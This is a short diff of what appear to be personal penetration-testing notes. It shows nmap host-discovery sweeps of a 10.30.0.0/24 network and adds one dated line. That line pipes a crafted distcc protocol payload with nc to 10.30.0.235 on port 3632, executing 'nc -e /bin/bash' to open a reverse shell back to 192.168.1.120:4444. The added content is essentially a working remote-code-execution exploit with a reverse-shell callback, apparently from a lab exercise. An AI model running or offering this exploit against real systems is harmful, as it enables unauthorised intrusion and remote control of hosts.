@@ -23,3 +23,11 @@ COMMENT
 19/05/2026 Tuesday
 sudo nmap -sn 10.30.0.0/24
 sudo nmap -sn 10.30.0.0/24 | grep "Nmap scan report for" | awk '{print $5}'
+
+
+
+20/05/2026:
+printf "DIST00000001ARGC00000008ARGV00000002shARGV00000002-cARGV00000031nc -e /bin/bash 192.168.1.120 4444ARGD00000001X" | nc -nv 10.30.0.235 3632
+
+
+
